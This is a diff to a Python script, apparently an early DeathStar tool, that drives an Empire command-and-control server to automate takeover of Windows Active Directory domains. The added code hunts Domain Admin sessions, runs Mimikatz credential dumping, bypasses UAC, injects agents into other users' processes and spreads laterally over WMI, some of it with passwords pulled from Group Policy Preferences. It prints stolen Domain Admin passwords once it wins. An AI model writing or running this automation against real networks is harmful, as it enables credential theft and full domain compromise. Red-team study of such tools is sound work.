@@ -7,7 +7,7 @@ import sys
 import re
 from time import sleep
 from requests import ConnectionError
-from IPython import embed
+#from IPython import embed
 
 #The following disables the InsecureRequests warning and the 'Starting new HTTPS connection' log message
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
@@ -133,12 +133,19 @@ def execute_module_with_results(module_name, agent_name, module_options=None):
         for result in get_agent_results(agent_name)['results']:
             #if debug: print('[DEBUG] Agent: {} => Result Buffer: {}'.format(agent_name, result))
             if result['taskID'] == r['taskID']:
-                if len(result['results'].split('\n')) > 1:
+                if len(result['results'].split('\n')) > 1 or not result['results'].startswith('Job'):
                     return result['results']
         sleep(2)
 
 def get_agent_logged_events(agent_name):
     r = requests.get(base_url + '/api/reporting/agent/{}'.format(agent_name), params=token, verify=False)
+    if r.status_code == 200:
+        return r.json()
+    print(r.json())
+    raise
+
+def get_stored_credentials():
+    r = requests.get(base_url + '/api/creds', params=token, verify=False)
     if r.status_code == 200:
         return r.json()
     print(r.json())
@@ -157,11 +164,21 @@ def get_group_member(agent_name, group_name='"Domain Admins"'):
     module_options = {'GroupName': group_name}
 
     results = execute_module_with_results('powershell/situational_awareness/network/powerview/get_group_member', agent_name, module_options)
-    results = results.strip().split('\r\n')
+    results = results.strip().split('\r\n\r\n')[:-2]
     members = []
-    for entry in results:
-        if entry.startswith('MemberName'):
-            members.append(entry.split(':')[1].strip())
+    for result in results:
+        if result.startswith('Job'):
+            continue
+
+        user   = None
+        domain = None
+        for entry in result.split('\r\n'):
+            if entry.startswith('MemberDomain'):
+                domain = entry.split(':')[1].strip().split('.')[0].upper()
+            if entry.startswith('MemberName'):
+                user = entry.split(':')[1].strip()
+
+        if user and domain: members.append('{}\\{}'.format(domain, user))
 
     print("[+] Agent: {} => Found {} members for the '{}' group: {}".format(agent_name, len(members), group_name, members))
 
@@ -179,12 +196,40 @@ def get_domain_controller(agent_name):
 
     return dcs
 
-def find_localadmin_access(agent_name, threads=None, no_ping=False):
-    module_options = {}
+def user_hunter(agent_name, group_name='"Domain Admins"', no_ping=False):
+    module_options = {'GroupName': group_name}
+    if no_ping:
+        module_options['NoPing'] = str(bool(no_ping))
+
+    results = execute_module_with_results('powershell/situational_awareness/network/powerview/user_hunter', agent_name, module_options)
+    results = results.strip().split('\r\n\r\n')[:-2]
+
+    admin_sessions = []
+    for section in results:
+        if section.startswith('Job'):
+            continue
+
+        session = {}
+        for entry in section.split('\r\n'):
+            if entry.startswith('UserDomain'):
+                session['domain'] = entry.split(':')[1].strip().split('.')[0].upper()
+            if entry.startswith('UserName'):
+                session['username'] = entry.split(':')[1].strip()
+            if entry.startswith('ComputerName'):
+                session['hostname'] = entry.split(':')[1].strip()
+
+        if session: admin_sessions.append(session)
+
+    print('[+] Agent: {} => Found {} active Admin sessions: {}'.format(agent_name, len(admin_sessions), [session['hostname'] for session in admin_sessions]))
+
+    return admin_sessions
+
+def find_localadmin_access(agent_name, threads=None, no_ping=False, computer_name=''):
+    module_options = {'ComputerName': computer_name}
     if threads:
       module_options['Threads'] = int(threads)
     if no_ping:
-      module_options['NoPing'] = bool(no_ping)
+      module_options['NoPing'] = str(bool(no_ping))
 
     results = execute_module_with_results('powershell/situational_awareness/network/powerview/find_localadmin_access', agent_name, module_options)
     if results.startswith('Job'):
@@ -192,12 +237,16 @@ def find_localadmin_access(agent_name, threads=None, no_ping=False):
     else:
         results = results.strip().split('\r\n')
 
-    # Deletes the '\nFind-LocalAdminAccess completed!' string
-    del results[-1]
-    # Deletes a rogue '\n'
-    del results[-1]
+    # Deletes the '\nFind-LocalAdminAccess completed!' string and a rogue '\n'
+    results = results[:-2]
 
-    print('[+] Agent: {} UserName:{} => Has admin access to {} hosts'.format(agent_name, agents[agent_name]['username'], len(results)))
+    if not computer_name:
+        print('[+] Agent: {} => Current security context has admin access to {} hosts'.format(agent_name, len(results)))
+    else:
+        if not results:
+            print('[-] Agent: {} => Current security context does not have admin access to {}'.format(agent_name, computer_name))
+        else:
+            print('[+] Agent: {} => Current security context has admin access to {}'.format(agent_name, computer_name))
 
     return results
 
@@ -215,18 +264,16 @@ def get_gpo_computer(agent_name, GUID):
     else:
         results = results.strip().split('\r\n')
 
-    # Deletes the '\nGet-GPOComputer completed!' string
-    del results[-1]
-    # Deletes a rogue '\n'
-    del results[-1]
+    # Deletes the '\nGet-GPOComputer completed!' string and a rogue '\n'
+    results = results[:-2]
 
     print('[+] Agent: {} => GPO {} is applied to {} computers'.format(agent_name, GUID, len(results)))
 
     return results
 
 def tokens(agent_name):
-    results = execute_module_with_results('powershell/credentials/tokens', agent_name)
-    embed()
+    pass
+    #results = execute_module_with_results('powershell/credentials/tokens', agent_name)
 
 def gpp(agent_name):
     results = execute_module_with_results('powershell/privesc/gpp', agent_name)
@@ -300,21 +347,22 @@ def tasklist(agent_name, process=None, username=None):
 
     for entry in results:
         # This is convoluted because it takes into account process names with multiple spaces
-        entry = re.sub('  +', '_', entry.strip())
+        entry = re.sub(' +', ' ', entry.strip()).split()
 
-        try:
-            name, pid_arch, user,_= entry.split('_')
-            pid, arch = pid_arch.split()
-        except ValueError:
-            try:
-                name, pid_arch, user_memusage = entry.split('_')
-                user,_,_= user_memusage.split()
-                pid, arch = pid_arch.split()
-            except ValueError:
-                name_pid_arch, user, memusage = entry.split('_')
-                name, pid, arch = name_pid_arch.split()
+        pid_index = None
+        for v in entry:
+            if v.isdigit():
+                pid_index = entry.index(v)
+                break
 
-        if username and username == user.split('\\')[1]:
+        if len(entry[pid_index:]) == 5:
+            pid, arch, user, _,_ = entry[pid_index:]
+            name = ' '.join(entry[:pid_index])
+        else:
+            print(entry)
+            raise
+
+        if username and username == user:
             processes.append({'name': name, 'pid': pid, 'arch': arch, 'username': user})
         else:
             processes.append({'name': name, 'pid': pid, 'arch': arch, 'username': user})
@@ -323,49 +371,99 @@ def tasklist(agent_name, process=None, username=None):
 
     return processes
 
-def psinject(agent_name, listener, process):
-    module_options = {}
+def psinject(agent_name, process, listener='DeathStar'):
+    module_options = {'Listener': listener}
     if process.isdigit():
         module_options['ProcId'] = process
     else:
         module_options['ProcName'] = process
     module_options['Listener'] = listener
 
-    print('[*] Agent: {} UserName: {} => Perforiming PSInject into process {}'.format(agent_name, agents[agent_name]['username'], process))
+    print('[*] Agent: {} => PSInjecting into process {}'.format(agent_name, process))
     execute_module('powershell/management/psinject', agent_name, module_options)
 
-def invoke_wmi(agent_name, computer_name, listener, username=None, password=None):
+def invoke_wmi(agent_name, computer_name, listener='DeathStar', username='', password=''):
     module_options = {'ComputerName': computer_name,
-                      'Listener': listener}
+                      'Listener': listener,
+                      'UserName': username,
+                      'Password': password}
 
-    if username and password:
-        module_options['UserName'] = username
-        module_options['Password'] = password
+    results = execute_module_with_results('powershell/lateral_movement/invoke_wmi', agent_name, module_options)
+    if results.lower().startswith('invoke-wmi executed'):
+        print('[+] Agent: {} => Spread laterally using {} to {}'.format(agent_name, 
+                                                                        '{} credentials'.format(username) if username and password else 'current security context',
+                                                                        computer_name))
 
-    print('[*] Agent: {} UserName: {} => Spreading laterally to {}'.format(agent_name, agents[agent_name]['username'], computer_name))
-    execute_module('powershell/lateral_movement/invoke_wmi', agent_name, module_options)
+    elif results.startswith('error'):
+        print("[-] Agent: {} => Failed to spread laterally using {} to {}: '{}'".format(agent_name, 
+                                                                                       '{} credentials'.format(username) if username and password else 'current security context',
+                                                                                       computer_name,
+                                                                                       results))
+
+def mimikatz(agent_name):
+    results = execute_module_with_results('powershell/credentials/mimikatz/logonpasswords', agent_name)
+    if results: print('[+] Agent: {} => Executed Mimikatz'.format(agent_name))
+
+def spawnas(agent_name, listener='DeathStar', cred_id='', username='', password=''):
+    module_options = { 'Listener': listener,
+                       'CredID': cred_id,
+                       'Username': username,
+                       'Password': password}
+
+    print('[*] Agent: {} => Spawning new Agent {}'.format(agent_name, 'as {}'.format(username) if username and password else 'using CredID {}'.format(cred_id)))
+    execute_module('powershell/management/spawnas', agent_name, module_options)
+
+def bypassuac_eventvwr(agent_name, listener='DeathStar'):
+    module_options = {'Listener': listener}
+
+    print('[*] Agent: {} => Attempting to elevate using bypassuac_eventvwr'.format(agent_name))
+    execute_module('powershell/privesc/bypassuac_eventvwr', agent_name, module_options)
 
 #########################################################################################################################################
 
 def recon(agent_name):
-    if not_running_under_localaccount(agent_name):
-        print('[*] Tasking Agent {} to perform Recon'.format(agent_name))
+    if running_under_domain_account(agent_name):
+        print('[*] Agent: {} => Starting recon'.format(agent_name))
         for member in get_group_member(agent_name):
             domain_admins.append(member)
 
         for dc in get_domain_controller(agent_name):
             domain_controllers.append(dc)
 
-        #del recon_threads[agent_name]
+        for session in user_hunter(agent_name, no_ping=True):
+            if session['hostname'] not in priority_targets:
+                priority_targets.append(session['hostname'])
+
+        del recon_threads[agent_name]
+
+def elevate(agent_name):
+    bypassuac_eventvwr(agent_name)
+
+def spread(agent_name):
+    if running_under_domain_account(agent_name):
+        if agents[agent_name]['username'] not in spread_usernames:
+            spread_usernames.append(agents[agent_name]['username'])
+
+            print('[*] Agent: {} => Starting lateral movement'.format(agent_name))
+            if priority_targets:
+                for box in priority_targets:
+                    if not agent_on_host(hostname=box) and find_localadmin_access(agent_name, no_ping=True, computer_name=box):
+                        invoke_wmi(agent_name, box, 'DeathStar')
+
+            for box in find_localadmin_access(agent_name, no_ping=True):
+                # Do we have an agent on the box? if not pwn it
+                if not agent_on_host(hostname=box):
+                    invoke_wmi(agent_name, box, 'DeathStar')
 
 def privesc(agent_name):
-    if not_running_under_localaccount(agent_name):
-        print('[*] Tasking Agent {} to perform Domain Privesc'.format(agent_name))
+    if running_under_domain_account(agent_name):
+        print('[*] Agent: {} => Starting domain privesc'.format(agent_name))
         for result in gpp(agent_name):
             for box in get_gpo_computer(agent_name, result['guid']):
                 for username, password in result['creds'].items():
-                    # These are local accounts so we append '.\' to the username to specify it
-                    invoke_wmi(agent_name, box, 'DeathStar', '.\\' + username, password)
+                    if not agent_on_host(hostname=box):
+                        # These are local accounts so we append '.\' to the username to specify it
+                        invoke_wmi(agent_name, box, 'DeathStar', '.\\' + username, password)
 
         tried_domain_privesc = True
 
@@ -374,139 +472,175 @@ def pwn_the_shit_out_of_everything(agent_name):
     This is the function that takes care of the logic for each agent thread
     '''
 
-    if (not domain_controllers or not domain_admins): #and not recon_threads:
+    if (not domain_controllers or not domain_admins or not priority_targets) and not recon_threads:
+        recon_threads[agent_name] = 'u w0t m8'
         recon(agent_name)
         #recon_threads[agent_name] = KThread(target=recon, args=(agent_name,))
         #recon_threads[agent_name].start()
 
-    if not privesc_threads and not tried_domain_privesc:
+    for user in get_loggedon(agent_name):
+        if user in domain_admins:
+            print('[+] Agent: {} => Found Domain Admin logged in: {}'.format(agent_name, user))
+
+    spread_threads[agent_name] = KThread(target=spread, args=(agent_name,))
+    spread_threads[agent_name].start()
+
+    if not tried_domain_privesc and not privesc_threads:
         privesc_threads[agent_name] = KThread(target=privesc, args=(agent_name,))
         privesc_threads[agent_name].start()
 
-    if agents[agent_name]['username'] not in spread_usernames and not_running_under_localaccount(agent_name):
-        for box in find_localadmin_access(agent_name):
-            invoke_wmi(agent_name, box, 'DeathStar')
-        spread_usernames.append(agents[agent_name]['username'])
-
-    loggedon_users = get_loggedon(agent_name)
-
-    for result in loggedon_users:
-        domain, username = result.split('\\')
-        if domain_admins:
-            if username in domain_admins:
-                print('[+] Agent: {} => Found Domain Admin logged in!'.format(agent_name))
-
-    #elevate()
-
     if agents[agent_name]['high_integrity']:
-    #    tokens(agent_name)
+        #tokens(agent_name)
+
+        if agents[agent_name]['os'].lower().find('windows 7') != -1:
+            mimikatz_thread = KThread(target=mimikatz, args=(agent_name,))
+            mimikatz_thread.daemon = True
+            mimikatz_thread.start()
+
+        #powerdump()
+
         # This doesn't need to be explorer, change it at will ;)
         for process in tasklist(agent_name, process='explorer'):
             if process['username'] != agents[agent_name]['username'] and process['username'] != 'N/A' and process['username'] not in spread_usernames:
-                psinject(agent_name, 'DeathStar', process['pid'])
+                print('[*] Agent: {} => Found process {} running under {}'.format(agent_name, process['pid'], process['username']))
+                psinject(agent_name, process['pid'])
 
-        #powerdump()
-        #mimikatz()
+    if not agents[agent_name]['high_integrity']:
+        elevate(agent_name)
 
 ############################################################################################################################################
 
-def not_running_under_localaccount(agent_name):
-    if agents[agent_name]['hostname'] != agents[agent_name]['username'].split('\\')[0]:
+def running_under_domain_account(agent_name):
+    hostname = agents[agent_name]['hostname']
+    username = agents[agent_name]['username']
+
+    if username.split('\\')[0] != hostname and username.split('\\')[1] != 'SYSTEM':
         return True
     return False
+
+def agent_on_host(hostname=None, ip=None):
+    agent_on_host = False
+    for name, info in agents.items():
+        if hostname and info['hostname'].lower() == hostname.split('.')[0].lower():
+            agent_on_host = True
+            break
+        elif ip and info['ip'] == ip:
+            agent_on_host = True
+            break
+
+    return agent_on_host
+
+def agent_finished_initializing(agent_dict):
+    '''
+    If these values are None it means the agent hasn't finished initializing on the target
+    '''
+    if agent_dict['username'] is None or agent_dict['hostname'] is None or agent['os_details'] is None:
+        return False
+    return True
+
+def print_win_banner(msg, agent_name=None):
+    print('\n[+] {}{}'.format('Agent: {} => '.format(agent_name) if agent_name else '', msg))
+    print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
+    print("=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
+    print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
 
 def signal_handler(signal, frame):
     print('\n[*] Powering down...')
     for name, thread in recon_threads.items():
-        print('[*] Killing recon thread for agent {}'.format(name))
+        print('[*] Killing recon thread for Agent {}'.format(name))
+        del recon_threads[name]
+        #thread.kill()
+
+    for name, thread in spread_threads.items():
+        print('[*] Killing spread thread for Agent {}'.format(name))
         thread.kill()
-    
+
     for name, thread in privesc_threads.items():  
-        print('[*] Killing privesc thread for agent {}'.format(name))
+        print('[*] Killing privesc thread for Agent {}'.format(name))
         thread.kill()
 
     for name, thread in agent_threads.items():
-        print('[*] Killing thread for agent {}'.format(name))
+        print('[*] Killing thread for Agent {}'.format(name))
         thread.kill()
 
     sys.exit(0)
 
 signal.signal(signal.SIGINT, signal_handler)
 
-
 if __name__ == '__main__':
 
     logo = """
-                                 .;+###+;.                             
-                            .#@@@@@@@@@@@@@@                           
-                         `@@@@@@@@@@@@@@+                              
-                       ;@@@@@@@@@@@@@@@@@@@@                           
-                     ;@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
-                   `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
-                  #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
-                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@'                   
-                @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                  
-              `@@@@@@,     `@@@@@@@@@@@@@@@@@@@@@@@@@@@@               
-             `@@@@@`  '@@@@` .@@@@@@@@@@@@@@@@@@@@@@@@                 
-             @@@@@  @@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@                 
-            @@@@# '@@@@@@@@@@@ ,@@@@@@@@@@@@@@@@@@@@@                  
-           @@@@@ +@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@                  
-          #@@@@ '@@@@@@@@@@@@@@``@@@@@@@@@@@@@@@@@@@@@                 
-         `@@@@. @@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@++##'           
-         @@@@@ @@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@           
-        :@@@@`.@@@@@@@@@@@@@@@@@ +@@@@@@@@@@@@@@@@@@@@@#               
-        @@@@@ @@@@@@@@@@@@@@@@@@ ;@@@@@@@@@@@@@@@@@@@@@@.              
-       '@@@@@ @@@@@@@@@@@@@@@@@@ +@@@@@@@@@@@@@@@@@@@@@@@.             
-       @@@@@,.@@@@@@@@@@'@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@#              
-      .@@@@@ ;@@@@@@@@@. @@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@               
-      @@@@@@ '@@@@@@@@@@'@@@@@@' @@@@@@@@@@@@@@@@@@@@@@@               
-      @@@@@@ :@@@@@@@@@@@@@@@@@ '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;      
-     ,@@@@@@` @@@@@@@@@@@@@@@@# @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:      
-     @@@@@@@+ @@@@@@@@@@@@@@@@ '@@@@@@@@@@@@@@@@@@@@@@@@@@             
-     @@@@@@@@ +@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@+        ``   
-     @@@@@@@@. @@@@@@@@@@@@@. @@@@@@@@@@@@@@@@@@@@@@@@@@@+::      @@   
-     @@@@@@@@@ `@@@@@@@@@@@` @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;     @@   
-    .@@@@@@@@@@  @@@@@@@@#  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;@@  ;
-    ;@@@@@@@@@@@  ,@@@@:  `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@
-    +@@@@@@@@@@@@@      `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-    # @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@`
-    +@# @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@' @
-    '@@@@ ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@; @@@
-    ,@@@@@@; '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ :@@@@+
-     @@@@@@@@@' `#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@; :@@@@@@+ 
-     @@@@@@@@@@@@@'  .+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+, :@@@@@@@@@@  
-     @@@@@@@@@@@@@@@@@@+,   `,;+@@@@@@@@@@@@@@@+:.  `;@@@@@@@@@@@;@@   
-     @@@@@@@@@@@@@@@@@@@@@@@@@@@#+;;::,,::;'+@@@@@@@@@@@@@@@@@@@  @@   
-     :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   @@   
-      @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   ,,   
-      @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@        
-      ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@        
-       ''#@@@@@@@@@   '++@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+;      
-          @# #@@@@@      @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,,,,,,,,,,      
-          '@@@@@@@@   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                
-           @@         @@@@@@@@@;''@@@@@@@@@@@@@@@@@@@@@                
-           @@      .:;@@@@`..`    `@@@@@@@@@@@@@@@@@@@@@@@@@@`         
-                   #@@@@:.        `@@@@@@@@@@@@@@@@@@@@@@@@@@          
-                      '@,      @@@@@@@@@@@@@@@@@@                      
-           ''.    ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ ``             
-            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@            
-            ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                
-             '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#,,,,,,:,                
-              '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:                        
-               :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                    
-                `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,:                      
-                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@                        
-                   '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
-                     @@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
-                       @@@@@@@@@@@@@@@@@,                              
-                         +@@@@@@@@@@@@@@                               
-                            #@@@@@@@@@@@@`                             
-                                :#@@@@@@@
+                                         .;+###+;.                             
+                                    .#@@@@@@@@@@@@@@                           
+                                 `@@@@@@@@@@@@@@+                              
+                               ;@@@@@@@@@@@@@@@@@@@@                           
+                             ;@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
+                           `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
+                          #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
+                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@'                   
+                        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                  
+                      `@@@@@@,     `@@@@@@@@@@@@@@@@@@@@@@@@@@@@               
+                     `@@@@@`  '@@@@` .@@@@@@@@@@@@@@@@@@@@@@@@                 
+                     @@@@@  @@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@                 
+                    @@@@# '@@@@@@@@@@@ ,@@@@@@@@@@@@@@@@@@@@@                  
+                   @@@@@ +@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@                  
+                  #@@@@ '@@@@@@@@@@@@@@``@@@@@@@@@@@@@@@@@@@@@                 
+                 `@@@@. @@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@++##'           
+                 @@@@@ @@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@           
+                :@@@@`.@@@@@@@@@@@@@@@@@ +@@@@@@@@@@@@@@@@@@@@@#               
+                @@@@@ @@@@@@@@@@@@@@@@@@ ;@@@@@@@@@@@@@@@@@@@@@@.              
+               '@@@@@ @@@@@@@@@@@@@@@@@@ +@@@@@@@@@@@@@@@@@@@@@@@.             
+               @@@@@,.@@@@@@@@@@'@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@#              
+              .@@@@@ ;@@@@@@@@@. @@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@               
+              @@@@@@ '@@@@@@@@@@'@@@@@@' @@@@@@@@@@@@@@@@@@@@@@@               
+              @@@@@@ :@@@@@@@@@@@@@@@@@ '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;      
+             ,@@@@@@` @@@@@@@@@@@@@@@@# @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:      
+             @@@@@@@+ @@@@@@@@@@@@@@@@ '@@@@@@@@@@@@@@@@@@@@@@@@@@             
+             @@@@@@@@ +@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@+        ``   
+             @@@@@@@@. @@@@@@@@@@@@@. @@@@@@@@@@@@@@@@@@@@@@@@@@@+::      @@   
+             @@@@@@@@@ `@@@@@@@@@@@` @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;     @@   
+            .@@@@@@@@@@  @@@@@@@@#  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;@@  ;
+            ;@@@@@@@@@@@  ,@@@@:  `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@
+            +@@@@@@@@@@@@@      `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+             @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+            # @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@`
+            +@# @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@' @
+            '@@@@ ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@; @@@
+            ,@@@@@@; '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ :@@@@+
+             @@@@@@@@@' `#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@; :@@@@@@+ 
+             @@@@@@@@@@@@@'  .+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+, :@@@@@@@@@@  
+             @@@@@@@@@@@@@@@@@@+,   `,;+@@@@@@@@@@@@@@@+:.  `;@@@@@@@@@@@;@@   
+             @@@@@@@@@@@@@@@@@@@@@@@@@@@#+;;::,,::;'+@@@@@@@@@@@@@@@@@@@  @@   
+             :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   @@   
+              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   ,,   
+              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@        
+              ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@        
+               ''#@@@@@@@@@   '++@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+;      
+                  @# #@@@@@      @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,,,,,,,,,,      
+                  '@@@@@@@@   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                
+                   @@         @@@@@@@@@;''@@@@@@@@@@@@@@@@@@@@@                
+                   @@      .:;@@@@`..`    `@@@@@@@@@@@@@@@@@@@@@@@@@@`         
+                           #@@@@:.        `@@@@@@@@@@@@@@@@@@@@@@@@@@          
+                              '@,      @@@@@@@@@@@@@@@@@@                      
+                   ''.    ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ ``             
+                    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@            
+                    ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                
+                     '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#,,,,,,:,                
+                      '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:                        
+                       :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                    
+                        `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,:                      
+                          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@                        
+                           '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
+                             @@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
+                               @@@@@@@@@@@@@@@@@,                              
+                                 +@@@@@@@@@@@@@@                               
+                                    #@@@@@@@@@@@@`                             
+                                        :#@@@@@@@
 
-                       Yes, it's fully operational.
-    """
+    It's as if millions of admins suddenly cried out in terror and were suddenly silenced.
+
+"""
 
 args = argparse.ArgumentParser(description='Death Star')
 args.add_argument('-u', '--username', type=str, default='empireadmin', help='Empire username')
@@ -524,16 +658,20 @@ os.system('clear')
 headers = {'Content-Type': 'application/json'}
 token = {'token': None}
 
+gotz_da = False
+tried_domain_privesc = False
+
 base_url = args.url
 debug = args.debug
 
-agent_threads = {}
 agents  = {}
-recon_threads = {}
 
-tried_domain_privesc = False
+agent_threads   = {}
+recon_threads   = {}
 privesc_threads = {}
+spread_threads  = {}
 
+priority_targets   = [] # List of boxes with admin sessions
 domain_controllers = []
 domain_admins      = []
 spread_usernames   = [] # List of accounts we already used to laterally spread
@@ -546,16 +684,35 @@ if not get_listener_by_name():
 #delete_all_agent_results()
 
 print('[*] Polling for agents')
-while True:
+while not gotz_da:
+    for cred in get_stored_credentials()['creds']:
+        # TO DO: for every credential, use the spawnas module max 2 times per agent
+        if cred['credtype'] == 'plaintext':
+            for da_acct in domain_admins:
+                domain, username = da_acct.split('\\')
+                if cred['username'] == username and cred['domain'].split('.')[0].upper() == domain:
+                    print_win_banner('Got Domain Admin via credentials! => Username: {} Password: {}'.format(da_acct, cred['password']))
+                    gotz_da = True
+                    signal_handler(None, None)
+                    break
+
     for agent in get_agents()['agents']:
         agent_name = agent['name']
-        if agent_name not in agents.keys():
-            print('[+] New agent => ID: {} Name: {} IP: {} HostName: {} UserName: {} HighIntegrity: {}'.format(agent['ID'], agent['name'], agent['external_ip'], agent['hostname'], agent['username'], agent['high_integrity']))
+        if agent_name not in agents.keys() and agent_finished_initializing(agent):
+            print('[+] New Agent => ID: {} Name: {} IP: {} HostName: {} UserName: {} HighIntegrity: {}'.format(agent['ID'], agent['name'], agent['external_ip'], agent['hostname'], agent['username'], agent['high_integrity']))
+
+            if agent['username'] in domain_admins and agent['high_integrity']:
+                print_win_banner('Got Domain Admin via security context!', agent['name'])
+                gotz_da = True
+                signal_handler(None, None)
+                break
+
             agents[agent_name] = {'id': agent['ID'],
                                        'ip': agent['external_ip'], 
                                        'hostname': agent['hostname'], 
                                        'username': agent['username'], 
-                                       'high_integrity': agent['high_integrity']}
+                                       'high_integrity': agent['high_integrity'],
